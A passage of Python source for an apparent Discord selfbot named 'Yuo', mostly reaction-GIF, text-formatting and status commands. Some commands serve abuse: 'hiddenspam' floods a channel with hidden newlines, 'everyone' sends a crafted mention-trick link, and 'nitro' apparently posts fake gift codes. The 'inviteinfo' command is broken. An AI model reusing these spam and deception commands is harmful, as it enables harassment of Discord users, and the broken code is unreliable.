    r = requests.get("https://nekos.life/api/v2/img/feed")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Yuo_feed.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Yuo.command()
async def tickle(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/tickle")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Yuo_tickle.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Yuo.command()
async def slap(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/slap")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Yuo_slap.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Yuo.command()
async def hug(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/hug")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Yuo_hug.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Yuo.command()
async def cuddle(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/cuddle")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Yuo_cuddle.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Yuo.command()
async def smug(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/smug")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Yuo_smug.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Yuo.command()
async def pat(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/pat")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Yuo_pat.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Yuo.command()
async def kiss(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/kiss")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Yuo_kiss.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Yuo.command(aliases=['invitei', 'ii'], pass_context=True)
async def inviteinfo(ctx, *, invite: str = None):
        await ctx.message.delete()
        if invite:
            for url in re.findall(r'(https?://\S+)', invite):
                try:
                    invite = await self.bot.get_invite(urlparse(url).path.replace('/', '').replace('<', '').replace('>', ''))
                except discord.NotFound:
                    return await ctx.send(self.bot.bot_prefix + "Couldn't find valid invite, please double check the link.")
                break
        else:
            async for msg in ctx.message.channel.history():
                if any(x in msg.content for x in self.invites):
                    for url in re.findall(r'(https?://\S+)', msg.content):
                        url = urlparse(url)
                        if any(x in url for x in self.invite_domains):
                            print(url)
                            url = url.path.replace('/', '').replace('<', '').replace('>', '').replace('\'', '').replace(')', '')
                            print(url)
                            try:
                                invite = await self.bot.get_invite(url)
                            except discord.NotFound:
                                return await ctx.send(self.bot.bot_prefix + "Couldn't find valid invite, please double check the link.")
                            break
                
        if not invite:
            return await ctx.send(self.bot.bot_prefix + "Couldn't find an invite in the last 100 messages. Please specify an invite.")


@Yuo.command()
async def sitepreview(ctx, link=''):
	if link == '':
		await ctx.send("what website???")
	else:
		await ctx.send("please wait, this may take 5-7 seconds")
		f = open("siteprev.png", 'wb')
		f.write(
		    requests.get(
		        f'https://shot.screenshotapi.net/screenshot?&url={link}&full_page=true&fresh=true&output=image&file_type=png'
		    ).content)
		f.close()
		lol = discord.File(fp=f"siteprev.png")
		flrl = link.replace('https://', '')
		await ctx.send(f"website preview of {flrl}", file=lol)


@Yuo.command()
async def uptime(ctx):
    await ctx.message.delete()
    now = datetime.datetime.utcnow()  # Timestamp of when uptime function is run
    delta = now - start_time
    hours, remainder = divmod(int(delta.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    days, hours = divmod(hours, 24)
    if days:
        time_format = "**{d}** days, **{h}** hours, **{m}** minutes, and **{s}** seconds."
    else:
        time_format = "**{h}** hours, **{m}** minutes, and **{s}** seconds."
    uptime_stamp = time_format.format(d=days, h=hours, m=minutes, s=seconds)
    await ctx.send(uptime_stamp)


@Yuo.command()
async def purge(ctx, amount: int):
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == Yuo.user).map(
            lambda m: m):
        try:
            await message.delete()
        except:
            pass


@Yuo.command(name='group-leaver',
                aliase=['leaveallgroups', 'leavegroup', 'leavegroups', "groupleave", "groupleaver"])
async def _group_leaver(ctx):
    await ctx.message.delete()
    for channel in Yuo.private_channels:
        if isinstance(channel, discord.GroupChannel):
            await channel.leave()


@Yuo.command(aliases=["streaming"])
async def stream(ctx, *, message):
    await ctx.message.delete()
    stream = discord.Streaming(
        name=message,
        url=stream_url,
    )
    await Yuo.change_presence(activity=stream)


@Yuo.command(alises=["game"])
async def playing(ctx, *, message):
    await ctx.message.delete()
    game = discord.Game(
        name=message
    )
    await Yuo.change_presence(activity=game)


@Yuo.command(aliases=["listen"])
async def listening(ctx, *, message):
    await ctx.message.delete()
    await Yuo.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening,
            name=message,
        ))


@Yuo.command(aliases=["watch"])
async def watching(ctx, *, message):
    await ctx.message.delete()
    await Yuo.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=message
        ))


@Yuo.command(aliases=["stopstreaming", "stopstatus", "stoplistening", "stopplaying", "stopwatching"])
async def stopactivity(ctx):
    await ctx.message.delete()
    await Yuo.change_presence(activity=None, status=discord.Status.dnd)


@Yuo.command()
async def reverse(ctx, *, message):
    await ctx.message.delete()
    message = message[::-1]
    await ctx.send(message)


@Yuo.command()
async def shrug(ctx):
    await ctx.message.delete()
    shrug = r'¯\_(ツ)_/¯'
    await ctx.send(shrug)


@Yuo.command()
async def lenny(ctx):
    await ctx.message.delete()
    lenny = '( ͡° ͜ʖ ͡°)'
    await ctx.send(lenny)


@Yuo.command(aliases=["fliptable"])
async def tableflip(ctx):
    await ctx.message.delete()
    tableflip = '(╯°□°）╯︵ ┻━┻'
    await ctx.send(tableflip)


@Yuo.command()
async def unflip(ctx):
    await ctx.message.delete()
    unflip = '┬─┬ ノ( ゜-゜ノ)'
    await ctx.send(unflip)


@Yuo.command()
async def bold(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('**' + message + '**')


@Yuo.command()
async def censor(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('||' + message + '||')


@Yuo.command()
async def underline(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('__' + message + '__')


@Yuo.command()
async def italicize(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('*' + message + '*')


@Yuo.command()
async def strike(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('~~' + message + '~~')


@Yuo.command()
async def quote(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('> ' + message)


@Yuo.command(aliases=['hspam'])
async def hiddenspam(ctx):
    await ctx.message.delete()
    await ctx.send("||" + '\n' * 1996 + '||')


@Yuo.command()
async def code(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('`' + message + "`")


@Yuo.command(name='rolecolor')
async def _role_hexcode(ctx, *, role: discord.Role):
    await ctx.message.delete()
    await ctx.send(f"{role.name} : {role.color}")


@Yuo.command()
async def empty(ctx):
    await ctx.message.delete()
    await ctx.send(chr(173))


@Yuo.command()
async def everyone(ctx):
    await ctx.message.delete()
    await ctx.send('https://@everyone@google.com')


@Yuo.command(aliases=["logout"])
async def shutdown(ctx):
    await ctx.message.delete()
    await Yuo.logout()


@Yuo.command()
async def nitro(ctx):
    await ctx.message.delete()
    await ctx.send(Nitro())


if __name__ == '__main__':
    Init()
    GetDic()